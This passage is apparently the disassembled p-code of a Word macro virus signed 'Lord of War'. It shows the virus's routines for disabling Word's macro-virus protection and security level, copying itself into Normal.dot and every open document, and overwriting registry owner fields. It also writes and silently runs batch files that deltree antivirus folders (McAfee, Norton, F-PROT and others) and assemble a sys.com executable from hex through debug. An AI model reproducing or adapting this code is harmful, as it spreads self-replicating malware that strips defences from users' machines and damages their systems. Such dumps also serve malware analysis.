' 	LitStr 0x0009 "Wednesday"
' 	LitStr 0x0008 "Thursday"
' 	LitStr 0x0006 "Friday"
' 	LitStr 0x0008 "Saturday"
' 	ArgsLd Choose 0x0008 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Date 
' 	LitStr 0x000C "dd-mmmm-yyyy"
' 	Paren 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0019 " congratulation to you..."
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt strPesan 0x0001 
' Line #405:
' 	LitStr 0x0008 "Created "
' 	Ld Date 
' 	LitStr 0x000C "dd-mmmm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	LitStr 0x0047 " Bogor West Java - Indonesia  member of Faxzu Software Development Inc."
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt strPesan 0x0001 
' Line #406:
' 	LitStr 0x0019 "Happy Birthday [23-April-"
' 	LitDI2 0x0006 
' 	ArgsSt strPesan 0x0001 
' Line #407:
' 	Ld Date 
' 	LitStr 0x000C "dd-mmmm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x0007 
' 	ArgsSt strPesan 0x0001 
' Line #408:
' 	LitStr 0x0029 "] to you my girl... and still loving me. "
' 	LitDI2 0x0008 
' 	ArgsSt strPesan 0x0001 
' Line #409:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	SelectCase 
' Line #410:
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0006 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #411:
' 	EndSelect 
' Line #412:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #413:
' 	Ld Timer 
' 	St Waktu 
' Line #414:
' 	LitDI2 0x0000 
' 	St i 
' Line #415:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Le 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Ge 
' 	And 
' 	DoWhile 
' Line #416:
' 	Ld i 
' 	ArgsLd strPesan 0x0001 
' 	Ld msg 
' 	ArgsCall Pesan 0x0002 
' Line #417:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #418:
' 	Ld i 
' 	LitDI2 0x0005 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #419:
' 	Loop 
' Line #420:
' 	EndSub 
' Line #421:
' Line #422:
' 	FuncDefn (Sub ShowMe())
' Line #423:
' 	Dim 
' 	VarDefn Maks
' 	VarDefn Min (As Integer)
' Line #424:
' 	OnError (Resume Next) 
' Line #425:
' 	Ld Tator 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #426:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #427:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	St Caption 
' Line #428:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #429:
' 	LitDI2 0x0001 
' 	St Maks 
' Line #430:
' 	LitStr 0x0001 " "
' 	Ld Application 
' 	MemSt Caption 
' Line #431:
' 	Ld Windows 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveWindow 
' 	Set actWindow 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' 	EndIf 
' Line #432:
' 	ElseBlock 
' Line #433:
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' Line #434:
' 	LitStr 0x0000 ""
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #435:
' 	LitDI2 0x1029 
' 	UMi 
' 	St Maks 
' Line #436:
' 	EndIfBlock 
' Line #437:
' 	Ld Maks 
' 	Ld Application 
' 	MemSt WindowState 
' Line #438:
' 	Ld Maks 
' 	Ld actWindow 
' 	MemSt WindowState 
' Line #439:
' 	Ld actWindow 
' 	ArgsCall Message 0x0001 
' Line #440:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #441:
' 	Ld Caption 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #442:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' Line #443:
' 	EndIfBlock 
' Line #444:
' 	EndSub 
' Line #445:
' Line #446:
' 	FuncDefn (Function Tator() As Boolean)
' Line #447:
' 	Ld KeyWord 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld GetCreator 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Tator 
' 	EndIf 
' Line #448:
' 	EndFunc 
' Line #449:
' Line #450:
' 	FuncDefn (Sub Aplikasi())
' Line #451:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #452:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St TempPath 
' Line #453:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Active 
' Line #454:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Temp 
' Line #455:
' 	EndIfBlock 
' Line #456:
' 	EndSub 
' Line #457:
' Line #458:
' 	FuncDefn (Sub Stealth())
' Line #459:
' 	OnError (Resume Next) 
' Line #460:
' 	Dim 
' 	VarDefn windir1 (As String)
' Line #461:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St windir1 
' Line #462:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #463:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #464:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #465:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #466:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' Line #467:
' 	Ld windir1 
' 	LitStr 0x0007 "\System"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsMemStWith DefaultFilePath 0x0001 
' Line #468:
' 	EndWith 
' Line #469:
' 	EndSub 
' Line #470:
' Line #471:
' 	FuncDefn (Sub Infection())
' Line #472:
' 	OnError (Resume Next) 
' Line #473:
' 	Dim 
' 	VarDefn DocuName
' 	VarDefn docinf (As Boolean)
' Line #474:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' 	VarDefn Nminf (As Boolean)
' Line #475:
' 	Dim 
' 	VarDefn aDoc
' Line #476:
' 	Dim 
' 	VarDefn windir1 (As String)
' 	VarDefn fileok (As String)
' Line #477:
' 	Dim 
' 	VarDefn windir (As String)
' Line #478:
' 	LitVarSpecial (False)
' 	St Nminf 
' Line #479:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #480:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocuName 
' Line #481:
' 	Ld DocuName 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nminf 
' 	EndIf 
' Line #482:
' 	Ld DocuName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld DocuName 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #483:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocuName 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #484:
' 	EndIfBlock 
' Line #485:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #486:
' Line #487:
' 	ArgsCall Hidden 0x0000 
' Line #488:
' 	OnError (Resume Next) 
' Line #489:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	Ld Date 
' 	LitDI2 0x000A 
' 	Add 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #490:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	Ld Ver 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #491:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #492:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0009 "Agustinus"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #493:
' Line #494:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #495:
' 	LitStr 0x000B "Lord of War"
' 	MemStWith UserName 
' Line #496:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	MemStWith UserInitials 
' Line #497:
' 	Ld faxzu 
' 	MemStWith UserAddress 
' Line #498:
' 	EndWith 
' Line #499:
' 	ArgsCall Stealth 0x0000 
' Line #500:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St windir1 
' Line #501:
' 	Ld windir1 
' 	LitStr 0x0007 "\System"
' 	Concat 
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #502:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St windir 
' Line #503:
' Line #504:
' 	Ld Nminf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #505:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #506:
' 	EndIfBlock 
' Line #507:
' 	Ld windir 
' 	LitStr 0x000B "\Office.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St fileok 
' Line #508:
' 	Ld fileok 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #509:
' 	Ld windir 
' 	LitStr 0x000B "\Office.dot"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	ArgsMemCall SaveAs 0x0005 
' Line #510:
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #511:
' 	EndIfBlock 
' Line #512:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St fileok 
' Line #513:
' 	Ld fileok 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #514:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	ArgsMemCall SaveAs 0x0005 
' Line #515:
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #516:
' 	EndIfBlock 
' Line #517:
' Line #518:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #519:
' 	ArgsCall TempActive 0x0000 
' Line #520:
' 	StartWithExpr 
' 	LitDI2 0x0056 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #521:
' 	LitStr 0x000B "Lord of War"
' 	MemStWith Author 
' Line #522:
' 	LitStr 0x0023 "Hello it's nice to meet you here!!!"
' 	MemStWith Title 
' Line #523:
' 	LitStr 0x001D "Have a nice day to my friends"
' 	MemStWith Subject 
' Line #524:
' 	LitStr 0x000E "Contact us at "
' 	Ld faxzu 
' 	Concat 
' 	MemStWith Comments 
' Line #525:
' 	ArgsMemCallWith Execute 0x0000 
' Line #526:
' 	EndWith 
' Line #527:
' 	LitVarSpecial (False)
' 	Ld aDoc 
' 	MemSt ReadOnlyRecommended 
' Line #528:
' 	Ld aDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld aDoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #529:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #530:
' 	EndSub 
' Line #531:
' Line #532:
' 	FuncDefn (Sub Damt())
' Line #533:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #534:
' 	EndSub 
' Line #535:
' Line #536:
' 	FuncDefn (Sub Damf())
' Line #537:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #538:
' 	EndSub 
' Line #539:
' Line #540:
' 	FuncDefn (Sub Hidden())
' Line #541:
' 	OnError (Resume Next) 
' Line #542:
' 	Dim 
' 	VarDefn org (As String)
' Line #543:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x0018 "Office\9.0\Word\Security"
' 	Concat 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #544:
' 	ArgsCall Unvisible 0x0000 
' Line #545:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x0018 "Office\9.0\Word\Security"
' 	Concat 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #546:
' 	ElseBlock 
' Line #547:
' 	ArgsCall Unvisible 0x0000 
' Line #548:
' 	LitStr 0x0012 "...by Lord of War "
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x0007 "Office\"
' 	Concat 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #549:
' 	EndIfBlock 
' Line #550:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #551:
' 	LitStr 0x000E "Lord of War..."
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0007 "InfoTip"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #552:
' 	LitStr 0x000E "Contact us at "
' 	Ld faxzu 
' 	Concat 
' 	LitStr 0x0007 " &u&b&d"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "footer"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #553:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0012 " &w&bPage &p of &P"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "header"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #554:
' 	LitStr 0x0011 "Microsoft Network"
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	LitStr 0x000E "Network\Logon\"
' 	Concat 
' 	LitStr 0x000F "PrimaryProvider"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #555:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	LitStr 0x000E "Network\Logon\"
' 	Concat 
' 	LitStr 0x0008 "username"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #556:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s1159"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #557:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s2359"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #558:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #559:
' 	Ld org 
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	IfBlock 
' Line #560:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0008 "OrgOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #561:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #562:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "OrgOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #563:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #564:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "OrgName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #565:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #566:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "OrgCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #567:
' 	LitStr 0x000B "Lord of War"
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #568:
' 	Ld faxzu 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #569:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #570:
' 	Ld faxzu 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #571:
' 	EndIfBlock 
' Line #572:
' 	EndWith 
' Line #573:
' 	EndSub 
' Line #574:
' Line #575:
' 	FuncDefn (Sub Earthquake())
' Line #576:
' 	LitStr 0x000C "C:\start.scr"
' 	ArgsCall (Call) p5687 0x0001 
' Line #577:
' 	LitStr 0x000D "c:\startv.bat"
' 	ArgsCall (Call) startv 0x0001 
' Line #578:
' 	ArgsCall Serang 0x0000 
' Line #579:
' 	EndSub 
' Line #580:
' Line #581:
' 	FuncDefn (Sub startv(strFile As String))
' Line #582:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #583:
' 	Ld hFile 
' 	Close 0x0001 
' Line #584:
' 	OnError (Resume Next) 
' Line #585:
' 	Ld Friend 
' 	St hFile 
' Line #586:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cd\"
' 	PrintItemNL 
' Line #589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "debug < start.scr > nul"
' 	PrintItemNL 
' Line #590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "copy sys.com sys.exe"
' 	PrintItemNL 
' Line #591:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del sys.com"
' 	PrintItemNL 
' Line #592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.scr"
' 	PrintItemNL 
' Line #593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "sys"
' 	PrintItemNL 
' Line #594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del sys.com"
' 	PrintItemNL 
' Line #595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "del startv.bat"
' 	PrintItemNL 
' Line #596:
' 	Ld hFile 
' 	Close 0x0001 
' Line #597:
' 	LitStr 0x000D "c:\startv.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #598:
' 	EndSub 
' Line #599:
' Line #600:
' 	FuncDefn (Sub zap(strFile As String))
' Line #601:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #602:
' 	Ld hFile 
' 	Close 0x0001 
' Line #603:
' 	OnError (Resume Next) 
' Line #604:
' 	Ld Friend 
' 	St hFile 
' Line #605:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "deltree /y c:\progra~1\banmacro"
' 	PrintItemNL 
' Line #608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "deltree /y c:\progra~1\mcafee\mcafee~1\*.*"
' 	PrintItemNL 
' Line #609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "deltree /y c:\progra~1\norton~1\*.*"
' 	PrintItemNL 
' Line #610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "deltree /y c:\progra~1\antivi~1\*.*"
' 	PrintItemNL 
' Line #611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "deltree /y c:\esafe\protect\*.*"
' 	PrintItemNL 
' Line #612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "deltree /y c:\progra~1\comman~1\F-PROT~1\*.*"
' 	PrintItemNL 
' Line #613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "deltree /y c:\PC-CIL~1\*.*"
' 	PrintItemNL 
' Line #614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "deltree /y c:\progra~1\QuickH~1\*.*"
' 	PrintItemNL 
' Line #615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "deltree /y c:\progra~1\FWIN32\*.*"
' 	PrintItemNL 
' Line #616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "deltree /y c:\progra~1\FindVi~1\*.*"
' 	PrintItemNL 
' Line #617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "deltree /y c:\Toolkit\FindVi~1\*.*"
' 	PrintItemNL 
' Line #618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "deltree /y c:\f-macro\*.*"
' 	PrintItemNL 
' Line #619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "deltree /y c:\TBAVW95\*.*"
' 	PrintItemNL 
' Line #620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "deltree /y c:\VS95\*.*"
' 	PrintItemNL 
' Line #621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "deltree /y c:\progra~1\micros~1\office\startup\*.*"
' 	PrintItemNL 
' Line #622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "deltree /y c:\progra~1\micros~1\templa~1\*.dot"
' 	PrintItemNL 
' Line #623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del zap.bat"
' 	PrintItemNL 
' Line #624:
' 	Ld hFile 
' 	Close 0x0001 
' Line #625:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #626:
' 	EndSub 
' Line #627:
' Line #628:
' 	FuncDefn (Sub p5687(strFile As String))
' Line #629:
' 	OnError (Resume Next) 
' Line #630:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #631:
' 	Ld Friend 
' 	St hFile 
' Line #632:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "N sys.com"
' 	PrintItemNL 
' Line #634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 4D 5A 36 01 01 00 00 00 04 00 00 00 FF FF 00 00"
' 	PrintItemNL 
' Line #635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #637:
